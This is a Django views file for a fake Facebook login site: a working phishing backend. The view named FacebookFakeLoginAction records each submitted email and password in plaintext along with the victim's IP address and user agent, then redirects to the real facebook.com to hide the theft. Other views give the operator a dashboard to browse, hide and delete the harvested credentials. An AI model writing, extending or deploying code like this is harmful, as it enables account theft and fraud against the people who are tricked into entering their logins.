from django.shortcuts import render, redirect
from .models import Facebook



def FacebookHome(request):

	return render(request, "facebook.html")


def FacebookDash(request):
	obj = Facebook.objects.all().filter(is_delete=True).order_by("-id")
	delcount = Facebook.objects.filter(is_delete=False).count()
	context = {"obj":obj, "delcount":delcount}
	return render(request, "facebookdash.html", context)

def FacebookFakeLoginAction(request):
	if request.method == "POST":
		username = request.POST["email"]
		password = request.POST["pass"]
		useragent = request.META['HTTP_USER_AGENT']
		ip = request.META['REMOTE_ADDR']
		Facebook.objects.create(
							username=username,
							password=password,
							useragent=useragent,
							ip=ip
						)
		return redirect("http://facebook.com")
	return redirect("http://facebook.com")



def FacebookDelete(request):
	if request.method == "POST":
		post = request.POST["id"]
		moi = Facebook.objects.get(id=post)
		moi.delete()
		return redirect("dash")
	else:
		return redirect("http://facebook.com")


def Facebookhidden(request):
	if request.method == "POST":
		pk = request.POST["id"]
		obj = Facebook.objects.get(id=pk)
		obj.is_delete = False
		obj.save()
		return redirect("dash")
	else:
		return redirect("http://facebook.com")

def FacebookNohidden(request):
	if request.method == "POST":
		pk = request.POST["id"]
		obj = Facebook.objects.get(id=pk)
		obj.is_delete = True
		obj.save()
		return redirect("fdd")
	else:
		return redirect("http://facebook.com")

def FacebookDashDel(request):
	obj = Facebook.objects.all().filter(is_delete=False).order_by("-id")
	delcount = Facebook.objects.filter(is_delete=False).count()
	context = {"obj":obj, "delcount":delcount}
	return render(request, "facebookdashdel.html", context)

